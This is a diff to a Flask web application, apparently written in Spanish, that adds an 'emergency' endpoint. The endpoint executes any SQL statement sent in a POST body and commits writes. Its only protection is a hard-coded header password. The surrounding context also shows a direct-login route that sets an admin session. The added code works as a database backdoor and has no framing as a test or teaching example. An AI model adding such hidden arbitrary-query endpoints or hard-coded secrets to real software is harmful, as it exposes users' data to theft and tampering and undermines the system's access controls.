@@ -1135,7 +1135,29 @@ def acceso_directo():
     session['user_nombre'] = user['nombre']
     
     return f"Sesión iniciada como {user['nombre']}. Ahora ve a /admin/panel"
-    
+
+@app.route('/emergencia/ejecutar_sql', methods=['POST'])
+def ejecutar_sql():
+    # Solo para emergencias, verificar una clave secreta
+    secreto = request.headers.get('X-Secreto')
+    if secreto != 'Atamashi2026':
+        return jsonify({'error': 'No autorizado'}), 403
+    data = request.get_json()
+    sql = data.get('sql')
+    if not sql:
+        return jsonify({'error': 'SQL requerido'}), 400
+    try:
+        db = get_db()
+        cursor = db.execute(sql)
+        if sql.strip().upper().startswith('SELECT'):
+            resultados = [dict(row) for row in cursor.fetchall()]
+            return jsonify({'resultados': resultados})
+        else:
+            db.commit()
+            return jsonify({'mensaje': 'Comando ejecutado', 'filas_afectadas': cursor.rowcount})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+        
 # ------------------- INICIAR SERVIDOR -------------------
 if __name__ == '__main__':
     with app.app_context():
